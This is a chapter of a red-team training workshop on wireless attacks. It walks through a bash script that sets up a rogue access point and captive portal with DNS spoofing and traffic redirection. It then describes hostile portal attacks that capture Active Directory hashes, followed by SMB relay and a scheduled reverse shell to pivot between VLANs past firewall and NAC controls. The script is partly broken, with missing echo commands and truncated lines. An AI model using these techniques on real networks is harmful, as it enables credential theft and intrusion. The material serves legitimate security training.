---
title: VI. Firewall And NAC Evasion Using Indirect Wireless Pivots
layout: workshop
---

# Table of Contents


   * [Workshop Overview](http://solstice.sh/workshops/advanced-wireless-attacks/)
   * [I. Target Identification Within A Red Team Environment](http://solstice.sh/workshops/advanced-wireless-attacks/i-target-identification-within-a-red-team-environment/)
   * [II. Attacking and Gaining Entry To WPA2-EAP Wireless Networks](http://solstice.sh/workshops/advanced-wireless-attacks/ii-attacking-and-gaining-entry-to-wpa2-eap-wireless-networks/)
   * [III. EAP Downgrade Attacks](http://solstice.sh/workshops/advanced-wireless-attacks/iii-eap-downgrade-attacks/)
   * [IV. Wireless Man-In-The-Middle Attacks](http://solstice.sh/workshops/advanced-wireless-attacks/iv-wireless-man-in-the-middle-attacks/)
   * [V. SMB Relays and LLMNR/NBT-NS Poisoning](http://solstice.sh/workshops/advanced-wireless-attacks/v-smb-relays-and-llmnr-nbt-ns-poisoning/)
   * ***[VI. Firewall And NAC Evasion Using Indirect Wireless Pivots](http://solstice.sh/workshops/advanced-wireless-attacks/vi-firewall-and-nac-evasion-using-indirect-wireless-pivots/)***

---

# Chapter Overview

In [Wireless Man-In-The-Middle Attacks](), we configured our Linux operating system to act as a wireless router. This allowed us to bridge traffic between our rogue access point and an upstream network interface, which enabled us to manipulate traffic. In this section, we’re going to learn a no-upstream attack that can be used to pivot from one segregated VLAN to another, bypassing firewall and NAC mechanisms in the process. Before we learn how to do this, however, we’ll need to learn how to configure Linux as a captive portal.

# Configuring Linux As A Captive Portal

There are multiple ways to configure Linux to act as a captive portal. The most straightforward method of doing this is by running our own DNS server that resolves all queries to the IP address of our rogue access point. Recall that in Wireless Man-In-The-Middle Attacks, we created a DHCP configuration file with the following options.

{% highlight bash %}

# define DHCP pool
dhcp-range=10.0.0.80,10.0.0.254,6h
# set Google as nameserver
dhcp-option=6,8.8.8.8
# set rogue AP as Gateway
dhcp-option=3,10.0.0.1 #Gateway
dhcp-authoritative
log-queries

{% endhighlight %}

We can modify this configuration so that the IP of our external wireless interface is specified as the network’s primary DNS server using a DHCP Option, as shown below.

{% highlight bash %}

# define DHCP pool
dhcp-range=10.0.0.80,10.0.0.254,6h
# set phy as nameserver
dhcp-option=6,10.0.0.1
# set rogue AP as Gateway
dhcp-option=3,10.0.0.1 #Gateway
dhcp-authoritative
log-queries

{% endhighlight %}

We then start dnsspoof as our nameserver, configuring it to resolve all DNS queries to our access point’s IP.

{% highlight bash %}

echo ’10.0.0.1’ > dnsspoof.conf
dnsspoof –i wlan0 -f ./dnsspoof.conf

{% endhighlight %}

This is a reasonably effective approach, as it allows us to respond to DNS queries in any way that we want. However, it still has a number of weaknesses. For one thing, wireless devices that connect to our rogue access point may choose to ignore the DHCP Option, selecting a nameserver manually instead. To prevent this from occurring, we can simply redirect any DNS traffic to our DNS server using iptables.

	iptables --table nat --append PREROUTING --protocol udp - -destination-port 53 --jump REDIRECT --to-port 53

Another problem with our current approach is that it does not account for the fact that most operating systems use a DNS cache to avoid having to make DNS lookups repeatedly. The domain names of the victim’s most frequently visited websites are likely to be in this cache. This means that our captive portal will fail in most situations until each of the entries in the cache expire.  Additionally, our current approach will fail to capture HTTP requests that do not make use of DNS. To deal with these issues, we can simply redirect all HTTP traffic to our own HTTP server.

	iptables --table nat --append PREROUTING --protocol tcp - -destination-port 80 --jump REDIRECT --to-port 80

We can incorporate these techniques into a bash script similar to the one we wrote in [Wireless Man-In-The-Middle Attacks](). Notice how we start Apache2 to serve content from /var/www/html.

{% highlight bash %}

phy=wlan0
channel=1
bssid=00:11:22:33:44:00
essid=FREE_WIFI

# kill interfering processes
service network-manager stop
nmcli radio wifi off
rfkill unblock wlan
ifconfig wlan0 up

echo “interface=$phy” > hostapd.conf
“driver=nl80211” >> hostapd.conf
“ssid=$essid” >> hostapd.conf
bssid=$bssid” >> hostapd.conf
“channel=$channel” >> hostapd.conf
“hw_mode=g” >> hostapd.conf

hostapd ./hostapd

ifconfig $phy 10.0.0.1 netmask 255.255.255.0
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1

echo "# define DHCP pool" > dnsmasq.conf
echo "dhcp-range=10.0.0.80,10.0.0.254,6h" >> dnsmasq.conf
echo "" >> dnsmasq.conf
echo "# set phy as nameserver" >> dnsmasq.conf
echo "dhcp-option=6,10.0.0.1" >> dnsmasq.conf
echo "" >> dnsmasq.conf
echo "# set rogue AP as Gateway" >> dnsmasq.conf
echo "dhcp-option=3,10.0.0.1 #Gateway" >> dnsmasq.conf
echo "" >> dnsmasq.conf
echo "dhcp-authoritative" >> dnsmasq.conf
echo "log-queries" >> dnsmasq.conf

dnsmasq -C ./dnsmasq.conf &

echo ’10.0.0.1’ > dnsspoof.conf
dnsspoof –i $phy -f ./dnsspoof.conf

systemctl start apache2

echo ‘1’ > /proc/sys/net/ipv4/ip_forward

iptables --policy INPUT ACCEPT
iptables --policy FORWARD ACCEPT
iptables --policy OUTPUT ACCEPT
iptables --flush
iptables --table nat --flush
iptables --table nat --append POSTROUTING -o $upstream --jump MASQUERADE
iptables --append FORWARD -i $phy -o $upstream --jump ACCEPT
iptables --table nat --append PREROUTING --protocol udp --destination-port

53 --jump REDIRECT --to-port 53
iptables --table nat --append PREROUTING --protocol tcp --destination-port
80 --jump REDIRECT --to-port 80
iptables --table nat --append PREROUTING --protocol tcp --destination-port

read -p ‘Press enter to quit…’

# kill daemon processes
for i in `pgrep dnsmasq`; do kill $i; done
for i in `pgrep hostapd`; do kill $i; done
for i in `pgrep dnsspoof`; do kill $i; done
for i in `pgrep apache2`; do kill $i; done

# restore iptables
iptables --flush
iptables --table nat –flush

{% endhighlight %}

# Lab Exercise: Captive Portal

Use your Kali VM to run the bash script that we wrote in this section to create a captive portal.  Connect to the captive portal using your Windows AD Victim virtual machine. From your Kali VM, notice the terminal output from dnsspoof that shows DNS queries being resolved to 10.0.0.1.  From your Windows AD Victim virtual machine, observe how all traffic is redirected to an html page served by your Kali VM. Additionally, follow the instructions found at the following URL to create a captive portal using EAPHammer:

 - [https://github.com/s0lst1c3/awae/blob/master/lab7/instructions.txt](https://github.com/s0lst1c3/awae/blob/master/lab7/instructions.txt)

# Wireless Theory: Hostile Portal Attacks and Indirect Wireless Pivots

Consider a scenario in which we have breached the perimeter of a wireless network that is used to provide access to sensitive internal resources. The sensitive resources are located on a restricted VLAN, which is not accessible from the sandboxed VLAN on which we are currently located. An authorized wireless device is currently connected to the wireless network as well, but is located on the restricted VLAN.

![evil twin attack](http://solstice.sh/images/workshops/awae/v/DC-Stage-1.png)

We can combine several of the attacks learned in this workshop to pivot into the restricted VLAN through the authorized device, even though we are located on a separate VLAN. To do this, we first force an authorized device to connect to us using an Evil Twin attack.

![evil twin attack](http://solstice.sh/images/workshops/awae/v/DC-Stage-2.png)

Once the workstation is connected to our rogue access point, we can redirect all HTTP and DNS traffic to our wireless interface as we did with the captive portal. However, instead of configuring our portal's HTTP server to merely serve a static HTML page, we configure it to redirect all HTTP traffic to an SMB share located on our machine.

![evil twin attack](http://solstice.sh/images/workshops/awae/v/hostile-portz0rz.png)

The result is that our victim is forced to authenticate with our SMB server using NTLM, allowing us to capture the victim's Active Directory username and password hash. The hash can be cracked offline to obtain a set of Active Directory credentials, which can then be used to pivot back into the victim. This is called a Hostile Portal attack.

Although Hostile Portal Attacks are a fast way to steal Active Directory credentials, they aren't the fastest solution to pivoting out of our sandbox. The reason for this is that password cracking is a time consuming process, even with powerful hardware. A more efficient approach is to ensnare multiple authorized devices using an Evil Twin attack, as shown in the diagram below.

Next, we use a Hostile Portal Attack as before to force Victim B (in the diagram above) to initiate NTLM authentication with the attacker. However, instead of merely capturing the NTLM hashes as before, we instead perform an SMB Relay attack from Victim B to Victim A. This gives us remote code execution on Victim A.

![evil twin attack](http://solstice.sh/images/workshops/awae/v/DC-Stage-3.png)

We use the SMB Relay attack to place a timed payload on Victim A, then kill our acccess point to allow both vitims to connect back to the target network. The timed payload could be a scheduled task that sends a reverse shell back to our machine, allowing us to pivot from one VLAN to the other. Since both victims are authorized endpoints, they are placed back on the restricted VLAN when they reassociate with the target network.

![evil twin attack](http://solstice.sh/images/workshops/awae/v/DC-Stage-4.png)

Once this happens, the attacker simply waits for the scheduled reverse shell from Victim A. Once the attacker receives the reverse shell, he or she pivots from the quarantine VLAN to the restricted VLAN.

![evil twin attack](http://solstice.sh/images/workshops/awae/v/dual-reverse.png)

# Futher Reading and Lab Exercise: Hostile Portal Attacks and Indirect Wireless Pivots

This document offers a mere overview designed to introduce the concepts of Hostile Portal Attacks and Indirect Wireless Pivots of the reader. This is deliberate, since both of these topics are covered in detail in EAPHammer's documentation. Your last "Lab Exercise", if you will, is to read up on these using EAPHammer's documentation. Make sure to read the section on Attacking WPA2-EAP Networks as well.

 - [https://github.com/s0lst1c3/eaphammer#iii---stealing-ad-credentials-using-hostile-portal-attacks](https://github.com/s0lst1c3/eaphammer#iii---stealing-ad-credentials-using-hostile-portal-attacks)

Once you've familiarized yourself with the attack, proceed to completing the lab exercise below.

1. Follow the instructions in the EAPHammer documentation to perform a Hostile Portal Attack against one of your Windows AD Victim machines. Make sure to perform the attack against an *open* network.
    - Remember that you can use a second wireless interface and EAPHammer to create an open network with which to practice on.
2. Repeat step 1, but this time perform the attack against a WPA2-EAP network that uses EAP-PEAP.
    - As with the last exercise, remember that you can use EAPHammer to create an EAP-PEAP network on which to practice

---

### Return to Workshop Overview: *[Workshop Overview](http://solstice.sh/workshops/advanced-wireless-attacks/)*

---
